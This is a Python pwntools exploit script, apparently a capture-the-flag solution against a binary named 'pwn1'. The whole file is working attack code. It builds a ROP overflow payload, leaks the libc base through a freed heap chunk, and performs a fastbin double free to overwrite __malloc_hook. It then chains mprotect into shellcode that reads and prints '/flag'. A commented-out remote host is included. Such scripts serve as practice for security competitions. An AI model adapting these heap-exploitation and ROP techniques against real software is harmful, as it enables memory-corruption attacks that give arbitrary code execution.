from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
def new(p, size, s):
    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(size))
    p.recvuntil('content')
    p.send(s)

def delete(p, idx):
    p.recvuntil('>>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(idx))

def disp(p, idx):
    p.recvuntil('>>')
    p.sendline('3')
    p.recvuntil('index')
    p.sendline(str(idx))


def main():
    p = process('./pwn1')
    #p = remote('172.16.9.21', 9007)
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so', checksec=False)
    p.recvuntil('name?')
    payload = 'a'*0x10 + p64(0x40118A)
    payload += p64(0) + p64(1) + p64(0x601FA0)
    payload += p64(0x500) + p64(0x6021C0) + p64(0)
    payload += p64(0x0401170)
    payload += p64(0)*2
    payload += p64(0x6021C0 - 8)
    payload += p64(0)*4
    payload += p64(0x401121)


    p.send(payload)
    new(p, 0x88, 'a')
    new(p, 0x68, 'a')
    new(p, 0x68, 'a')
    delete(p, 0)
    disp(p, 0)
    p.recvuntil('\n')
    libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - 0x3c4b78
    log.info(hex(libc_base))
    libc.address = libc_base
    new(p, 0x88, 'a')
    delete(p, 1)
    delete(p, 2)
    delete(p, 1)

    new(p, 0x68, p64(libc.sym['__malloc_hook'] - 0x23))
    new(p, 0x68, 'a')
    new(p, 0x68, 'a')
    new(p, 0x68, 'a'*0x13 + p64(libc_base + 0x210EE))

    p.recvuntil('>>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline('0')
    # 0x00000000001150c9 : pop rdx ; pop rsi ; ret
    # 0x0000000000021102 : pop rdi ; ret

    payload = p64(libc_base + 0x00000000001150c9)
    payload += p64(7) + p64(0x1000) + p64(libc_base + 0x0000000000021102)
    payload += p64(0x602000)
    payload += p64(libc.sym['mprotect'])
    payload += p64(0x602200)
    payload = payload.ljust(0x40, '\x00')
    payload += asm(shellcraft.amd64.openat(0, '/flag', 0, 0))
    payload += asm(shellcraft.amd64.read(3, 0x602100, 0x100))
    payload += asm(shellcraft.amd64.write(1, 0x602100, 0x100))
    #gdb.attach(p)
    p.sendline(payload)
    p.interactive()

main()